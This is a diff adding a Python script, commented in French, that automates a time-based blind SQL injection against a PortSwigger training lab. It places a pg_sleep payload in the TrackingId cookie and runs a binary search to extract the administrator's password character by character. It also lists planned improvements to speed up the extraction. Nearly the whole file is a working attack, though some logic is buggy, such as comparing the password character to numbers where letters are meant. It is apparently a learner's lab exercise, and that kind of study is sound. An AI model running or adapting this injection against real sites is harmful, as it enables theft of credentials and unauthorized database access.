@@ -1,0 +1,116 @@
+import requests
+import time 
+                                     
+""" EXPLICATION DU CODE:
+Le code est une automatisation d'un time-base blind sql injection, utilisant la recherche binaire afin d'améliorer
+la rapidité de recherche. 
+La target (ici un site web d'entrainement Portswigger) contient une vulnérabilité du type time-based blind SQLi, l'objectif
+de ce code est de facilité la recherche en utilisant une méthode binaire, qui fonctionne par élimination et comparaison.
+
+Basé sur le temps, le code peut recontrer des faux-positifs en de lenteur réseau.
+
+Les axes d'améliorations sont en bas de pages.
+
+
+
+"""
+
+
+def sending_payload(sec_p):
+    url = 'https://0a7400610422bf4e828c0ce3008b005f.web-security-academy.net/login'
+    #ICI la payload est dans le TrackingId car le cookie y est vulnérable
+    cookies = {
+        'TrackingId': f"I6C0bf2EWjlvRm8S' || (SELECT CASE WHEN (SELECT SUBSTRING(password,20,1) FROM users WHERE username = 'administrator'){sec_p} THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+        'session': 'y5kMuFfhJaz21JyOPckKN29R5o1Z8G2U'
+    }
+    #ICI on va pouvoir identifier le temps afin de voir si la SQLi a marché 
+    start_time = time.time()
+    r = requests.get(url, cookies=cookies)
+    end_time = time.time()
+    
+    result_bool = (end_time - start_time) >= 5
+    #Cette condition permet de vérifier si OUI ou NON la SQLi a été fonctionnelle
+    if result_bool:
+        print(f"Valeur trouvée pour {sec_p}")
+    else:
+        print(False)    
+    return result_bool
+    
+    return result_bool
+
+def sending_payload_controle(sec_p2):
+    url = 'https://0a7400610422bf4e828c0ce3008b005f.web-security-academy.net/login'
+       #ICI la payload est dans le TrackingId car le cookie y est vulnérable
+    cookies = {
+        'TrackingId': f"I6C0bf2EWjlvRm8S' || (SELECT CASE WHEN (SELECT SUBSTRING(password,20,1) FROM users WHERE username = 'administrator'){sec_p2} THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+        'session': 'y5kMuFfhJaz21JyOPckKN29R5o1Z8G2U'
+    }
+        #ICI on va pouvoir identifier le temps afin de voir si la SQLi a marché 
+
+    start_time = time.time()
+    r = requests.get(url, cookies=cookies)
+    end_time = time.time()
+    
+    
+    result_control = (end_time - start_time) >= 5
+    #Cette condition permet de vérifier si OUI ou NON la SQLi a été fonctionnelle
+    if result_control:
+        print(f"Valeur trouvée pour {sec_p2}")
+    else:
+        print(False)    
+    return result_control
+
+#Le programme ne test pas les lettres et les numéros simultanément, cela sera ajouté dans d'autres features 
+lettre = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
+l = 0
+r = 25
+#ICI les paramètres l et r sont configurés pour la liste lettre, pour tester les valeurs numériques il faut changer r et m
+#respectivement r = 10 et m = 5
+m = 13
+p = '>'
+p2 = '='
+sec_p = f"{p}'{m}'"
+result_bool = sending_payload(sec_p)
+while l <= r:#cette partie intègre la recherche binaire
+    try:
+        if result_bool == True and p =='<':
+            r = m - 1
+        if result_bool == True and p=='>':
+            l = m + 1
+        if result_bool == False and p == '>':
+            r = m- 1
+        if result_bool == False and p == '<':
+            l = m + 1
+    except:
+        print(f"VALEUR TROUVEE DU PREMIER COUP {m}")
+        break
+    m = (l+r)//2
+    sec_p = f"{p}'{m}'"
+    result_bool = sending_payload(sec_p)
+    sec_p2 = f"{p2}'{m}'"
+    result_control = sending_payload_controle(sec_p2)
+    
+    if result_control == True:
+        print(f"Succesfull payload {sec_p2}")
+        break
+#Les print n'ont pas réellement de sens ils sont surtout là pour m'aider à debugger le code
+    
+print(f"Le paramètre optimal de la payload est: {m}")
+
+""" 
+AXE D'AMELIORATION PRIORITAIRE:
+Les futurs améliorations seront notamment tournés sur le changement de test (lettre -> chiffre)
+Cette ordre facilite les choses car si le mdp ne comporte pas une lettre à la position donné la valeur sera de -1
+Permet donc de créer une condition à partir de cela.
+
+AXE D'AMELIORATION SECONDAIRE:
+L'autre axe d'amélioration est tourné vers l'automatisation du changement d'indice 
+(bien que cela dépende de la payloads envoyé)
+
+AXE D'AMELIORATION TERTIAIRE:
+Mettre en place un multithreading pour tester les lettres et les chiffres en même temps afin de gagner en temps.
+
+
+
+
+"""
